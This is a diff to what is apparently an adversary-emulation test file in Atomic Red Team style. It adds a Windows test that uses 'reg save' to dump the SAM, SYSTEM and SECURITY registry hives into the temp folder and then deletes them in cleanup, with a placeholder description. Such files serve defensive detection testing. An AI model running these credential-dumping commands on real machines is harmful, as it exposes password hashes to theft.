@@ -53,3 +53,18 @@ atomic_tests:
       pypykatz live registry
     name: command_prompt
     elevation_required: true
+  - name: dump credentials from windows registry
+    description: This is just a description
+    supported_platforms:
+    - windows
+    executor:
+      command: |-
+        reg save HKLM\sam %temp%\sam
+        reg save HKLM\system %temp%\system
+        reg save HKLM\security %temp%\security
+      cleanup_command: |-
+        del %temp%\sam >nul 2> nul
+        del %temp%\system >nul 2> nul
+        del %temp%\security >nul 2> nul
+      name: command_prompt
+      elevation_required: true
